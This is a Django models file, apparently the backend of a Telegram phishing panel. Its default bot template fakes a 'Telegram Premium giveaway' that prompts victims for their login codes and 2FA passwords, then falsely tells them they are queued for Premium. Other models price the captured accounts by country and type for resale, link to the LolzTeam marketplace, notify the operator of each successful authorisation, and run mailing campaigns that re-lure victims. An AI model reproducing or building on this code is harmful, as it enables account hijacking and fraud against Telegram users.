from django.db import models
from django.contrib.auth.models import User
from accounts.models import Account


class CountryPrice(models.Model):
    ACCOUNT_TYPES = [
        ('regular', 'Обычный'),
        ('spam_block_2fa', 'Спамблок & 2FA'),
        ('premium', 'Premium'),
    ]

    sales_plan = models.ForeignKey('SalesPlan', on_delete=models.CASCADE, related_name='country_prices')
    country = models.CharField(max_length=100, verbose_name="Страна")
    account_type = models.CharField(max_length=20, choices=ACCOUNT_TYPES, default='regular',
                                    verbose_name="Тип аккаунта")

    # Price fields for each account type
    price_regular = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True,
                                        verbose_name="Цена Обычный")
    not_for_sale_regular = models.BooleanField(default=False, verbose_name="Не продавать Обычный")

    price_spam = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True,
                                     verbose_name="Цена Спамблок & 2FA")
    not_for_sale_spam = models.BooleanField(default=False, verbose_name="Не продавать Спамблок & 2FA")

    price_premium = models.DecimalField(max_digits=10, decimal_places=2, null=True, blank=True,
                                        verbose_name="Цена Premium")
    not_for_sale_premium = models.BooleanField(default=False, verbose_name="Не продавать Premium")

    class Meta:
        verbose_name = 'Цена по стране'
        verbose_name_plural = 'Цены по странам'
        unique_together = ['sales_plan', 'country', 'account_type']

    def __str__(self):
        return f"{self.sales_plan.name} - {self.country} - {self.get_account_type_display()}"


class SalesPlan(models.Model):
    name = models.CharField(max_length=100, verbose_name="Название плана")
    product_name = models.CharField(max_length=200, verbose_name="Название товара")
    product_description = models.TextField(verbose_name="Описание товара")
    buyer_info = models.TextField(verbose_name="Информация для покупателя")
    owner = models.ForeignKey(User, on_delete=models.CASCADE)
    is_active = models.BooleanField(default=True, verbose_name="Активен")
    created_at = models.DateTimeField(auto_now_add=True, verbose_name="Создан")

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = 'План продаж'
        verbose_name_plural = 'Планы продаж'
        ordering = ['-created_at']


class BotTemplate(models.Model):
    name = models.CharField(max_length=100, verbose_name="Название шаблона")
    owner = models.ForeignKey(User, on_delete=models.CASCADE)
    created_at = models.DateTimeField(auto_now_add=True, verbose_name="Создан")
    updated_at = models.DateTimeField(auto_now=True, verbose_name="Обновлен")

    welcome_photo = models.ImageField(
        upload_to='bot_media/',
        blank=True,
        null=True,
        verbose_name="Фотография (необязательно)"
    )
    welcome_message = models.TextField(
        verbose_name="Текст сообщения",
        default="👋 <b>Приветствую, {name}</b>\n\n🎁 Telegram устроил розыгрыш Telegram Premium на {1 месяц|1 год}. Прямо сейчас <u>ты</u> можешь стать счастливым обладателем этой подписки\n\n👇 Для получения подписки авторизируйтесь"
    )
    login_button_text = models.CharField(
        max_length=50,
        default="📱 Войти",
        verbose_name="Текст кнопки"
    )

    sending_code_message = models.TextField(
        verbose_name="Отправляем код",
        default="⏳ <i>Отправляем код...</i>"
    )

    code_sent_message = models.TextField(
        verbose_name="Текст сообщения",
        default="💭 <b>Мы отправили вам код подтверждения</b>\n\nВведите его, используя кнопки выше"
    )
    view_code_button_text = models.CharField(
        max_length=50,
        blank=True,
        verbose_name="Кнопка Посмотреть код (необязательно)"
    )
    view_code_button_url = models.URLField(
        blank=True,
        verbose_name="Ссылка кнопки Посмотреть код (необязательно)"
    )

    checking_code_message = models.TextField(
        verbose_name="Проверяем",
        default="🕒 <i>Проверяем...</i>"
    )
    code_invalid_message = models.TextField(
        verbose_name="Код неверный",
        default="❌ <b>Код неверный!</b>\n\nПроверьте правильность ввода и повторите попытку\nВозможно, вы отправили код одним сообщением\nКод нужно вводить используя клавиши ниже"
    )

    password_request_message = models.TextField(
        verbose_name="Текст сообщения",
        default="🔑 <b>Введите пароль</b>"
    )
    checking_password_message = models.TextField(
        verbose_name="Проверяем",
        default="🕒 <i>Проверяем...</i>"
    )
    password_invalid_message = models.TextField(
        verbose_name="Пароль не верный",
        default="❌ <b>Пароль неверный!</b>\n\nПроверьте правильность ввода и повторите попытку"
    )

    success_photo = models.ImageField(
        upload_to='bot_media/',
        blank=True,
        null=True,
        verbose_name="Фотография (необязательно)"
    )
    success_message = models.TextField(
        verbose_name="Текст сообщения",
        default="✅ <b>Успешно!</b>\n\n🎁 Вы поставлены в очередь на получение Premium. Пожалуйста, ожидайте"
    )

    error_message = models.TextField(
        verbose_name="Текст сообщения",
        default="❌ Произошла ошибка\nПопробуйте позже\nОтказ в авторизации со стороны Telegram"
    )
    timeout_message = models.TextField(
        verbose_name="Текст сообщения",
        default="⏰❌ <b>Истекло время ожидания</b>\n\nПопробуйте снова!"
    )
    timeout_button_text = models.CharField(
        max_length=50,
        default="📱 Войти",
        verbose_name="Текст кнопки"
    )

    unknown_command_message = models.TextField(
        verbose_name="Неизвестная команда",
        default="🤔 Неизвестная команда"
    )

    support_text = models.CharField(
        max_length=100,
        default="Поддержка",
        verbose_name="Текст поддержки"
    )
    support_chat_url = models.URLField(
        blank=True,
        verbose_name="Ссылка на чат поддержки"
    )
    panel_chat_text = models.CharField(
        max_length=100,
        default="Чат панели",
        verbose_name="Текст чата панели"
    )
    panel_chat_url = models.URLField(
        blank=True,
        verbose_name="Ссылка на чат панели"
    )
    lolzteam_text = models.CharField(
        max_length=100,
        default="LolzTeam",
        verbose_name="Текст LolzTeam"
    )
    lolzteam_url = models.URLField(
        blank=True,
        verbose_name="Ссылка на LolzTeam"
    )

    requires_subscription = models.BooleanField(
        default=False,
        verbose_name="Требовать подписку"
    )
    subscription_channel = models.CharField(
        max_length=100,
        blank=True,
        verbose_name="Канал для подписки"
    )

    sponsor_url = models.URLField(
        blank=True,
        verbose_name="Ссылка спонсора"
    )
    sponsor_text = models.CharField(
        max_length=50,
        default="Спонсор",
        verbose_name="Текст кнопки спонсора"
    )

    is_active = models.BooleanField(default=True, verbose_name="Активен")

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = 'Шаблон бота'
        verbose_name_plural = 'Шаблоны ботов'
        ordering = ['-created_at']


class BotInstance(models.Model):
    AUTH_METHODS = [
        ('classic', 'Классическая'),
        ('web', 'Web (BETA)'),
    ]

    BOT_TYPES = [
        ('auth_bot', 'Бот авторизации'),
        ('premium_bot', 'Премиум бот'),
        ('multipurpose', 'Многофункциональный'),
    ]

    name = models.CharField(max_length=100, verbose_name="Название бота (внутреннее)")
    owner = models.ForeignKey(User, on_delete=models.CASCADE)
    template = models.ForeignKey(
        BotTemplate,
        on_delete=models.CASCADE,
        verbose_name="Шаблон бота",
        help_text="Выберите шаблон сообщений для бота"
    )
    sales_plan = models.ForeignKey(
        SalesPlan,
        on_delete=models.CASCADE,
        verbose_name="План продаж",
        help_text="Выберите план продаж для бота"
    )
    token = models.CharField(
        max_length=200,
        verbose_name="Токен бота",
        help_text="Токен бота от @BotFather"
    )

    bot_type = models.CharField(
        max_length=20,
        choices=BOT_TYPES,
        default='auth_bot',
        verbose_name="Тип бота"
    )
    created_at = models.DateTimeField(auto_now_add=True, verbose_name="Создан")

    webapp_url = models.URLField(
        blank=True,
        verbose_name="Web App URL",
        help_text="Только для Web авторизации"
    )
    webapp_button_text = models.CharField(
        max_length=50,
        default="🔐 Авторизоваться",
        verbose_name="Текст кнопки Web App"
    )

    channel = models.CharField(
        max_length=100,
        blank=True,
        verbose_name="Канал (необязательно)",
        help_text="Канал для подписки"
    )
    key = models.CharField(
        max_length=100,
        blank=True,
        verbose_name="Ключ (необязательно)",
        help_text="Секретный ключ для бота"
    )

    inline_keyboard = models.BooleanField(
        default=True,
        verbose_name="Inline-клавиатура",
        help_text="Показывать клавиатуру для ввода кода"
    )
    anti_steal = models.BooleanField(
        default=True,
        verbose_name="Антипиздилин",
        help_text="Защита от кражи сессий"
    )
    send_code_without_number = models.BooleanField(
        default=True,
        verbose_name="Отправка кода без номера",
        help_text="Скрывать номер телефона при отправке кода"
    )
    auto_delete_messages = models.BooleanField(
        default=True,
        verbose_name="Автоудаление сообщений",
        help_text="Автоматически удалять сообщения через указанное время"
    )
    message_timeout = models.IntegerField(
        default=30,
        verbose_name="Таймаут сообщений (сек)",
        help_text="Через сколько секунд удалять сообщения"
    )

    auth_method = models.CharField(
        max_length=20,
        choices=AUTH_METHODS,
        default='classic',
        verbose_name="Метод авторизации"
    )

    max_login_attempts = models.IntegerField(
        default=3,
        verbose_name="Максимум попыток входа",
        help_text="Максимальное количество попыток ввода кода"
    )
    session_timeout = models.IntegerField(
        default=300,
        verbose_name="Таймаут сессии (сек)",
        help_text="Время жизни сессии пользователя"
    )
    ip_whitelist = models.TextField(
        blank=True,
        verbose_name="Белый список IP",
        help_text="По одному IP на строку"
    )

    notify_on_success = models.BooleanField(
        default=True,
        verbose_name="Уведомлять об успешной авторизации"
    )
    notify_on_error = models.BooleanField(
        default=True,
        verbose_name="Уведомлять об ошибках"
    )
    admin_chat_id = models.CharField(
        max_length=50,
        blank=True,
        verbose_name="Chat ID администратора",
        help_text="Для получения уведомлений"
    )

    max_concurrent_sessions = models.IntegerField(
        default=10,
        verbose_name="Максимум одновременных сессий",
        help_text="Сколько пользователей могут авторизовываться одновременно"
    )
    request_delay = models.IntegerField(
        default=1,
        verbose_name="Задержка между запросами (сек)",
        help_text="Задержка между запросами к Telegram API"
    )

    enable_donations = models.BooleanField(
        default=False,
        verbose_name="Включить донаты"
    )
    donation_url = models.URLField(
        blank=True,
        verbose_name="Ссылка для донатов"
    )
    enable_ads = models.BooleanField(
        default=False,
        verbose_name="Показывать рекламу"
    )
    ads_interval = models.IntegerField(
        default=10,
        verbose_name="Интервал рекламы (сообщений)",
        help_text="Через сколько сообщений показывать рекламу"
    )

    enable_analytics = models.BooleanField(
        default=True,
        verbose_name="Включить аналитику",
        help_text="Собирать статистику использования"
    )
    enable_backups = models.BooleanField(
        default=True,
        verbose_name="Включить бэкапы",
        help_text="Автоматическое резервное копирование"
    )
    backup_interval = models.IntegerField(
        default=24,
        verbose_name="Интервал бэкапов (часы)",
        help_text="Как часто делать бэкапы"
    )

    description = models.TextField(
        blank=True,
        verbose_name="Описание бота",
        help_text="Внутреннее описание для вашего удобства"
    )
    tags = models.CharField(
        max_length=200,
        blank=True,
        verbose_name="Теги",
        help_text="Через запятую, для удобства поиска"
    )

    is_active = models.BooleanField(default=True, verbose_name="Активен")
    is_running = models.BooleanField(default=False, verbose_name="Запущен")
    last_started = models.DateTimeField(
        null=True,
        blank=True,
        verbose_name="Последний запуск"
    )
    error_message = models.TextField(
        blank=True,
        verbose_name="Сообщение об ошибке"
    )

    def get_auth_method_display(self):
        for method_code, method_name in self.AUTH_METHODS:
            if method_code == self.auth_method:
                return method_name
        return self.auth_method

    def __str__(self):
        return f"{self.name} ({self.get_auth_method_display()})"

    class Meta:
        verbose_name = 'Бот'
        verbose_name_plural = 'Боты'
        ordering = ['-created_at']


class BotLog(models.Model):
    LOG_LEVELS = [
        ('INFO', 'Информация'),
        ('WARNING', 'Предупреждение'),
        ('ERROR', 'Ошибка'),
        ('SUCCESS', 'Успех'),
    ]

    bot_instance = models.ForeignKey(
        BotInstance,
        on_delete=models.CASCADE,
        related_name='logs'
    )
    level = models.CharField(
        max_length=10,
        choices=LOG_LEVELS,
        default='INFO',
        verbose_name="Уровень"
    )
    action = models.CharField(max_length=100, verbose_name="Действие")
    details = models.TextField(blank=True, verbose_name="Детали")
    user_id = models.BigIntegerField(
        null=True,
        blank=True,
        verbose_name="ID пользователя"
    )
    username = models.CharField(
        max_length=100,
        blank=True,
        verbose_name="Username пользователя"
    )
    timestamp = models.DateTimeField(auto_now_add=True, verbose_name="Время")

    def __str__(self):
        return f"{self.bot_instance.name} - {self.action}"

    class Meta:
        verbose_name = 'Лог бота'
        verbose_name_plural = 'Логи ботов'
        ordering = ['-timestamp']


class MailingCampaign(models.Model):
    STATUS_CHOICES = [
        ('DRAFT', 'Черновик'),
        ('SCHEDULED', 'Запланирована'),
        ('SENDING', 'Отправляется'),
        ('SENT', 'Отправлена'),
        ('CANCELLED', 'Отменена'),
    ]

    name = models.CharField(max_length=100, verbose_name="Название рассылки")
    owner = models.ForeignKey(User, on_delete=models.CASCADE)
    message_text = models.TextField(
        verbose_name="Текст сообщения",
        default="👋 <b>Привет</b>\n👇 Попробуйте получить доступ снова"
    )
    created_at = models.DateTimeField(auto_now_add=True, verbose_name="Создана")
    scheduled_for = models.DateTimeField(
        null=True,
        blank=True,
        verbose_name="Запланирована на"
    )

    send_to_all = models.BooleanField(
        default=True,
        verbose_name="Все боты (По умолчанию)"
    )
    bots = models.ManyToManyField(
        BotInstance,
        blank=True,
        verbose_name="Боты для рассылки"
    )

    status = models.CharField(
        max_length=20,
        choices=STATUS_CHOICES,
        default='DRAFT',
        verbose_name="Статус"
    )
    sent_at = models.DateTimeField(
        null=True,
        blank=True,
        verbose_name="Отправлена"
    )
    total_recipients = models.IntegerField(
        default=0,
        verbose_name="Всего получателей"
    )
    successful_sends = models.IntegerField(
        default=0,
        verbose_name="Успешно отправлено"
    )
    failed_sends = models.IntegerField(
        default=0,
        verbose_name="Не удалось отправить"
    )

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = 'Рассылка'
        verbose_name_plural = 'Рассылки'
        ordering = ['-created_at']


class MailingLog(models.Model):
    mailing_campaign = models.ForeignKey(
        MailingCampaign,
        on_delete=models.CASCADE,
        related_name='logs'
    )
    bot_instance = models.ForeignKey(
        BotInstance,
        on_delete=models.CASCADE,
        verbose_name="Бот"
    )
    status = models.CharField(max_length=20, verbose_name="Статус")
    details = models.TextField(blank=True, verbose_name="Детали")
    timestamp = models.DateTimeField(auto_now_add=True, verbose_name="Время")

    def __str__(self):
        return f"{self.mailing_campaign.name} - {self.bot_instance.name}"

    class Meta:
        verbose_name = 'Лог рассылки'
        verbose_name_plural = 'Логи рассылок'
        ordering = ['-timestamp']